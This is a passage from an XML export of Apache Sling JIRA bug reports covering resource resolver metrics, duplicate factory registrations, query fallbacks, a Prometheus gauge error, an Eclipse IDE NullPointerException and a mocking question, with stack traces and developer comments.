                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 4 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1kg6g:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12020] resource resolver: alias metric has confusing name</title>
                <link>https://issues.apache.org/jira/browse/SLING-12020</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The metric &quot;numberOfAliases&quot; has a very very misleading name; actually it&apos;s the number of nodes that have any number of child nodes with aliases. So, this could be a magnitude less than the actual number of aliases.&lt;/p&gt;

&lt;p&gt;Rename? Fix? (that would require counting instead of just returning the map size)&lt;/p&gt;</description>
                <environment></environment>
        <key id="13550025">SLING-12020</key>
            <summary>resource resolver: alias metric has confusing name</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="reschke">Julian Reschke</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Fri, 8 Sep 2023 10:21:32 +0000</created>
                <updated>Thu, 21 Sep 2023 15:05:53 +0000</updated>
                            <resolved>Wed, 13 Sep 2023 11:40:30 +0000</resolved>
                                                    <fixVersion>Resource Resolver 1.11.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 6 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1k8ww:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12019] Avoid duplicate ResourceResolverFactory registrations</title>
                <link>https://issues.apache.org/jira/browse/SLING-12019</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;It seems that in some situations a new resource resolver factory is registered without unregistering the old one - which leads to two factories being registered. As not all components do eager service binding, these components stick to the old factory - and the old factory in turn is basically &quot;empty&quot; meaning all resource providers are unregistered. This prevents those components from reaching any resource, although everything looks fine.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13549736">SLING-12019</key>
            <summary>Avoid duplicate ResourceResolverFactory registrations</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="2" iconUrl="https://issues.apache.org/jira/images/icons/priorities/critical.svg">Critical</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="jsedding">Julian Sedding</assignee>
                                    <reporter username="cziegeler">Carsten Ziegeler</reporter>
                        <labels>
                    </labels>
                <created>Wed, 6 Sep 2023 05:11:58 +0000</created>
                <updated>Wed, 11 Oct 2023 13:12:47 +0000</updated>
                            <resolved>Mon, 18 Sep 2023 12:40:04 +0000</resolved>
                                    <version>Resource Resolver 1.10.0</version>
                                    <fixVersion>Resource Resolver 1.11.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17762277" author="cziegeler" created="Wed, 6 Sep 2023 05:14:53 +0000"  >&lt;p&gt;All registration and unregistration operations in ResourceResolverFactoryActivator need to be queued to avoid any race condition. We used to have large synchronized blocks around those to achieve this, however that lead to deadlocks as the service registry is called from a synchronized blocks. We then reduced the synchronized blocks to a minimum, which now can lead to the mentioned scenario.&lt;/p&gt;</comment>
                            <comment id="17764694" author="jsedding" created="Wed, 13 Sep 2023 13:57:18 +0000"  >&lt;p&gt;Merged &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/100&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR #100&lt;/a&gt;.&lt;/p&gt;</comment>
                            <comment id="17765071" author="jsedding" created="Thu, 14 Sep 2023 09:20:51 +0000"  >&lt;p&gt;I discovered an issue with the fix, affecting reconfiguration of &lt;tt&gt;ResourceResolverFactoryActivator&lt;/tt&gt; via its &lt;tt&gt;modified()&lt;/tt&gt; method. It can lead to no RRF being registered.&lt;/p&gt;</comment>
                            <comment id="17766367" author="jsedding" created="Mon, 18 Sep 2023 12:39:57 +0000"  >&lt;p&gt;Merged &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/pull/104&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;PR #104&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13553694">SLING-12090</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 5 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1k74o:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12017] resource resolver: add fallback when paged query fails due to missing index</title>
                <link>https://issues.apache.org/jira/browse/SLING-12017</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When the underlying repo supports the &quot;first&quot; operator, but the appropiate index is missing, the query might fail with an UnspportedOperationException, even though it might have suceeded without paging.&lt;/p&gt;

&lt;p&gt;Therefore, catch that exception and fallback to simple query.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13549414">SLING-12017</key>
            <summary>resource resolver: add fallback when paged query fails due to missing index</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="reschke">Julian Reschke</assignee>
                                    <reporter username="reschke">Julian Reschke</reporter>
                        <labels>
                    </labels>
                <created>Fri, 1 Sep 2023 13:19:02 +0000</created>
                <updated>Thu, 21 Sep 2023 15:05:53 +0000</updated>
                            <resolved>Mon, 4 Sep 2023 10:05:38 +0000</resolved>
                                                    <fixVersion>Resource Resolver 1.11.0</fixVersion>
                                    <component>ResourceResolver</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                    <issuelinks>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13446524">SLING-11342</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 7 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1k554:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12013] Commons Threads exports invalid &apos;Pid&apos; attribute as gauge</title>
                <link>https://issues.apache.org/jira/browse/SLING-12013</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The commons.thread bundle exports its JMX attributes as Gauges via the &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-commons-threads/blob/master/src/main/java/org/apache/sling/commons/threads/impl/ThreadPoolMetricsGauges.java&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;ThreadPoolMetricGauges class&lt;/a&gt;. In particular, it also exports the &apos;Pid&apos; attribute.&lt;/p&gt;

&lt;p&gt;This attribute does not make sense as a Gauge value ( it&apos;s a static, non-numeric, value ) and when exported ends up null. &lt;/p&gt;

&lt;p&gt;When used with the &lt;a href=&quot;https://github.com/apache/sling-whiteboard/tree/master/metrics-prometheus&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;prometheus bundle from the whiteboard&lt;/a&gt; it breaks the Prometheus metrics servlet, causing no metrics to be returned. Note that this is the code provided by the Prometheus SimpleClient bundle, we can&apos;t influence how it behaves. I tried.&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;29.08.2023 17:42:16.461 *ERROR* [FelixLogListener] LogService.org.apache.felix.http.jetty Exception while processing request to /metrics (java.lang.NullPointerException: Cannot invoke &quot;Object.getClass()&quot; because &quot;obj&quot; is null)
java.lang.NullPointerException: Cannot invoke &quot;Object.getClass()&quot; because &quot;obj&quot; is null
	at io.prometheus.client.dropwizard.DropwizardExports.fromGauge(DropwizardExports.java:55) [io.prometheus.simpleclient_dropwizard:0.0.23]
	at io.prometheus.client.dropwizard.DropwizardExports.collect(DropwizardExports.java:133) [io.prometheus.simpleclient_dropwizard:0.0.23]
	at io.prometheus.client.CollectorRegistry$MetricFamilySamplesEnumeration.findNextElement(CollectorRegistry.java:180) [io.prometheus.simpleclient:0.0.23]
	at io.prometheus.client.CollectorRegistry$MetricFamilySamplesEnumeration.&amp;lt;init&amp;gt;(CollectorRegistry.java:144) [io.prometheus.simpleclient:0.0.23]
	at io.prometheus.client.CollectorRegistry.filteredMetricFamilySamples(CollectorRegistry.java:131) [io.prometheus.simpleclient:0.0.23]
	at io.prometheus.client.exporter.MetricsServlet.doGet(MetricsServlet.java:43) [io.prometheus.simpleclient_servlet:0.0.23]
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:655) [org.apache.felix.http.servlet-api:1.2.0]
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) [org.apache.felix.http.servlet-api:1.2.0]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13549052">SLING-12013</key>
            <summary>Commons Threads exports invalid &apos;Pid&apos; attribute as gauge</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="2">Won&apos;t Fix</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Tue, 29 Aug 2023 21:51:22 +0000</created>
                <updated>Tue, 29 Aug 2023 22:49:41 +0000</updated>
                            <resolved>Tue, 29 Aug 2023 22:49:19 +0000</resolved>
                                                                    <component>Commons</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17760165" author="rombert" created="Tue, 29 Aug 2023 22:49:19 +0000"  >&lt;p&gt;The problem was fixed more than 5 years ago in the prometheus Java client - &lt;a href=&quot;https://github.com/prometheus/client_java/commit/3a5cef6618d4f4e741d541c1c79b31fb0488d068&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/prometheus/client_java/commit/3a5cef6618d4f4e741d541c1c79b31fb0488d068&lt;/a&gt; . I don&apos;t think this is worth fixing.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 8 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1k2wo:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12010] Updating project configuration fails: Cannot invoke &quot;String.isBlank()&quot; because &quot;webFacetVersionPropertyValue&quot; is null</title>
                <link>https://issues.apache.org/jira/browse/SLING-12010</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;While updating projects I get the following error&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;java.lang.NullPointerException: Cannot invoke &quot;String.isBlank()&quot; because &quot;webFacetVersionPropertyValue&quot; is null
	at org.apache.sling.ide.eclipse.m2e.internal.ContentPackageProjectConfigurator$WtpProjectConfigurer.addWtpFacets(ContentPackageProjectConfigurator.java:190)
	at org.apache.sling.ide.eclipse.m2e.internal.ContentPackageProjectConfigurator$WtpProjectConfigurer.configure(ContentPackageProjectConfigurator.java:173)
	at org.apache.sling.ide.eclipse.m2e.internal.ContentPackageProjectConfigurator.configure(ContentPackageProjectConfigurator.java:104)
	at org.eclipse.m2e.core.project.configurator.AbstractLifecycleMapping.configure(AbstractLifecycleMapping.java:123)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.lambda$6(ProjectConfigurationManager.java:504)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:394)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:275)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.updateProjectConfiguration(ProjectConfigurationManager.java:498)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.lambda$4(ProjectConfigurationManager.java:426)
	at java.base/java.util.Collection.removeIf(Collection.java:576)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.updateProjectConfiguration0(ProjectConfigurationManager.java:414)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.lambda$3(ProjectConfigurationManager.java:340)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.executeBare(MavenExecutionContext.java:394)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:275)
	at org.eclipse.m2e.core.internal.embedder.MavenExecutionContext.execute(MavenExecutionContext.java:214)
	at org.eclipse.m2e.core.internal.embedder.MavenImpl.execute(MavenImpl.java:1097)
	at org.eclipse.m2e.core.internal.project.ProjectConfigurationManager.updateProjectConfiguration(ProjectConfigurationManager.java:339)
	at org.eclipse.m2e.core.ui.internal.UpdateMavenProjectJob.runInWorkspace(UpdateMavenProjectJob.java:80)
	at org.eclipse.core.internal.resources.InternalWorkspaceJob.run(InternalWorkspaceJob.java:43)
	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13548382">SLING-12010</key>
            <summary>Updating project configuration fails: Cannot invoke &quot;String.isBlank()&quot; because &quot;webFacetVersionPropertyValue&quot; is null</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Wed, 23 Aug 2023 11:57:29 +0000</created>
                <updated>Thu, 25 Sep 2025 10:24:35 +0000</updated>
                            <resolved>Wed, 23 Aug 2023 13:12:28 +0000</resolved>
                                                    <fixVersion>Sling Eclipse IDE 1.3.0</fixVersion>
                                    <component>IDE</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 9 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jyrs:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-12001] Can&apos;t use MockFindQueryResources when making use of getServiceResourceResolver</title>
                <link>https://issues.apache.org/jira/browse/SLING-12001</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;I want to mock resourceResolver.findResources and found that there is a way to do this via &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/blob/master/src/main/java/org/apache/sling/testing/resourceresolver/MockFindQueryResources.java#L43&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/blob/master/src/main/java/org/apache/sling/testing/resourceresolver/MockFindQueryResources.java#L43&lt;/a&gt; &#160;&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
MockFindQueryResources.addFindResourceHandler(...) &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This works as long as the Sling Context its Resource Resolver (context.resourceResolver()) is used. But we have a piece of code, which uses a Service Resource Resolver:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;private&lt;/span&gt; ResourceResolver getServiceResolver() &lt;span class=&quot;code-keyword&quot;&gt;throws&lt;/span&gt; LoginException {
    &lt;span class=&quot;code-keyword&quot;&gt;return&lt;/span&gt; resourceResolverFactory.getServiceResourceResolver(
        Collections.singletonMap(ResourceResolverFactory.SUBSERVICE, CLEAN_UP_SERVICE_NAME)
    );
}&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
